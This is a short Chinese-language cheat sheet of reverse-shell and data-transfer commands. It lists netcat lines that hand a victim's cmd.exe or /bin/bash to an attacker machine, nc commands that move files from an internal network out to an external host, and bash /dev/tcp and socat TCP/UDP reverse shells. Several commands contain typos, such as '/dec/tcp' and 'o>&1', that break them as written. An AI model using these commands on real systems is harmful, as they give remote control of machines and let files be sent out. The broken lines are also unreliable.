反弹shell

利用nc反弹shell

tcp连接是被控服务器发起，连接外网攻击机

攻击机：nc -lvvp port

受害者：nc -e cmd.exe ip port

攻击机：nc ip port

受害者：nc -lvvp port -e /bin/bash

这是常见的连接方式

nc的几种用法

nc发送文件

1.内网发外网

发送端（内网）：nc 外网ip 外网端口 < 文件

接收端（外网）：nc -lvvp 外网端口 > 文件

2.外网发内网

发送端（外网）：nc -lvvp 外网端口 <文件

接收端（内网）：nc 外网ip 外网端口 > 文件

nc聊天

发送端：nc 接受ip 接收端口

接收端：nc -lvvp 端口

利用bash发送shell

接收端（外网）：nc -lvvp 外网端口

1.发送端（内网）：bash -i >& /dec/tcp/ip/port o>&1

2发送端（内网）：0<&31-;exec 31<>/dev/tcp/ip/port;sh <&31 >&31 2>&31

socat 发送shell

tcp

接收端（攻击机）：./socat tcp-listen:20001 -

发送端(靶机)：./socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:ip:port

udp

接收端：./socat udp-listen: 20001

发送端:./socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2>&1>/dev/null &
